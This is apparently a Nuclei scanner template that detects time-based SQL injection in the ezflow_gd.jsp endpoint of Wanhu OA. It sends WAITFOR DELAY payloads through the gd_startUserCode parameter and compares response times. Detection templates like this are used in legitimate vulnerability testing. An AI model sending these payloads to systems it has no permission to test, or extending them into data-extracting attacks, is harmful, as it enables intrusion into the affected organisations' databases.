id: wanhu-wf_gd-sqli

info:
  name: wanhu-wf_gd-sqli
  author: wanhu-wf_gd-sqli
  severity: high


requests:
  - raw:
      - |
        GET /defaultroot/login.jsp HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: identity
        Content-Type: text/xml; charset=utf-8
        Connection: close

      - |
        GET /defaultroot/platform/bpm/ezflow/operation/ezflow_gd.jsp;?gd=1&gd_startUserCode=1%27%3B%20WAITFOR%20DELAY%20%270:0:3%27-- HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: identity
        Content-Type: text/xml; charset=utf-8
        Connection: close

      - |
        GET /defaultroot/platform/bpm/ezflow/operation/ezflow_gd.jsp;?gd=1&gd_startUserCode=1%27%3B%20WAITFOR%20DELAY%20%270:0:6%27-- HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: identity
        Content-Type: text/xml; charset=utf-8
        Connection: close

      - |
        @timeout: 15
        GET /defaultroot/platform/bpm/ezflow/operation/ezflow_gd.jsp;?gd=1&gd_startUserCode=1%27%3B%20WAITFOR%20DELAY%20%270:0:9%27-- HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: identity
        Content-Type: text/xml; charset=utf-8
        Connection: close
        
    cookie-reuse: true
    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_2>=3  && duration_2<=6"
          - "duration_3>=6  && duration_3<=9"
          - "duration_4>=9  && duration_4<=12"
